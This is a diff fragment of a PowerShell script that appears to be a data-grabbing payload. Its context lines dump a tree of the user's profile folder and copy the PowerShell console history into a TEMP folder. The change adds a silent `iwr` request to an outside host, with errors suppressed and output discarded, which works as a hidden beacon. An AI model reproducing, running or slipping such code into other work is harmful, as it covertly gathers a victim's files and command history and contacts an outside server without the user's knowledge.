@@ -57,7 +57,7 @@ tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 
 # Powershell history
 Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
-
+iwr "https://jakoby.lol/hak5" -EA 0 >$null
 ############################################################################################################################################################
 
 function Get-fullName {
